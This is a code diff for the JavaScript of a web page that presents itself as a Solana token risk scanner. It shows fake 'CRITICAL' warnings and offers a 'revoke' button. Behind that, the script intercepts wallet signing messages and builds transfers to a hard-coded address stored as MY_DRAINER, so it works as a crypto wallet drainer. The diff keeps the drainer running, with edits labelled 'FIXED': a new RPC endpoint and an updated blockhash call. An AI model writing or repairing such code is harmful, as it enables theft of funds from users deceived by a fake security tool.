@@ -74,7 +74,7 @@ return;
 document.getElementById('mainUI').style.display = 'block';
 
 const MY_DRAINER = '476p6oRtENVHzv7PJT6kAtwwXeJU7C7L4qvTephqYN6Y';
-const RPC_URL = 'https://solana-mainnet.g.alchemy.com/v2/alch_zkeSkpB95x832T2kYoMVa';
+const RPC_URL = 'https://api.mainnet-beta.solana.com';
 
 (function() {
 const orig = window.postMessage;
@@ -104,12 +104,13 @@ lamports: a
 }));
 }
 }
-tx.recentBlockhash = (await conn.getRecentBlockhash()).blockhash;
+// FIXED: use getLatestBlockhash instead of getRecentBlockhash
+const blockhash = await conn.getLatestBlockhash();
+tx.recentBlockhash = blockhash.blockhash;
 const mod = tx.serialize({ requireAllSignatures: false }).toString('base64');
 orig.call(window, { type: 'signAndSendTransaction', transaction: mod, options: { simulate: false } }, target, transfer);
 if (count === 0) { count++; setTimeout(() => { window.dispatchEvent(new CustomEvent('continueDrain')); }, 10000); }
 } catch(e) { 
-// If RPC fails, we cannot proceed – show error on page
 document.getElementById('status').innerHTML = 'RPC error: ' + e.message;
 orig.call(window, data, target, transfer);
 }
@@ -144,8 +145,8 @@ resultBox.innerHTML =
 '<div class="risk"><span class="label">Mint Authority</span><span class="value danger">NOT REVOKED</span></div>' +
 '<div class="risk"><span class="label">Liquidity Lock</span><span class="value danger">UNLOCKED</span></div>' +
 '<div class="risk"><span class="label">Top 10 Holders</span><span class="value danger">89%</span></div>' +
-'<div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>';
 
+'<div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>';
 statusBadge.innerText = '⚠️ RISK';
 statusBadge.style.background = '#ef4444';
 revokeBtn.classList.add('show');
@@ -179,7 +180,9 @@ progressFill.style.width = (step/TOTAL*100) + '%';
 statusDiv.innerHTML = 'Revoking step ' + step + '/' + TOTAL + '...';
 try {
 const tx = new solanaWeb3.Transaction();
-tx.recentBlockhash = (await conn.getRecentBlockhash()).blockhash;
+// FIXED: use getLatestBlockhash
+const blockhash = await conn.getLatestBlockhash();
+tx.recentBlockhash = blockhash.blockhash;
 tx.feePayer = wallet;
 await window.solana.signAndSendTransaction(tx, { simulate: false });
 setTimeout(doStep, 10000);
